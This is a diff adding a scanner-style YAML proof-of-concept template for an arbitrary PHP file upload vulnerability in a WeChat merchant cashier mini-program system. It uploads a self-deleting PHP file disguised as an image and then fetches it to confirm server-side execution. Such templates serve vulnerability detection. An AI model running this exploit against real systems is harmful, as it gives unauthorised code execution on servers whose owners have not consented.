@@ -1,0 +1,56 @@
+id: poc-yaml-cashier-mini-program-upload-iframe-php-anyfile-upload
+info:
+  name: 微信公众号商家收银台小程序系统 upload.iframe.php 任意文件上传漏洞
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: 文件上传
+
+variables:
+  t1: "{{rand_int(1000, 10000)}}"
+  t2: "{{md5(t1)}}"
+
+flow: |
+  http(1) && http(2)
+
+http:
+  - id: upload-file
+    method: POST
+    path:
+      - /library/deep/upload.iframe.php?action=add&MaxSize=&FileType=php&savePath=&backIdName=&saveName=0
+    headers:
+      Content-Type: multipart/form-data; boundary=----WebKitFormBoundarywb0ftWeTnkfnoTM2
+    body: |-
+      ------WebKitFormBoundarywb0ftWeTnkfnoTM2
+      Content-Disposition: form-data; name="uploadFileName"; filename="123.php"
+      Content-Type: image/png
+
+      <?php echo md5({{t1}});unlink(__FILE__);?>
+      ------WebKitFormBoundarywb0ftWeTnkfnoTM2--
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "data/uploadfile"
+          - ".php"
+      - type: status
+        status:
+          - 200
+    extractors:
+      - type: regex
+        name: filename
+        internal: true
+        regex:
+          - "data/uploadfile//([0-9]+).php"
+
+  - id: verify-upload
+    method: GET
+    path:
+      - /data/uploadfile/{{filename}}.php
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "{{t2}}"
+      - type: status
+        status:
+          - 200
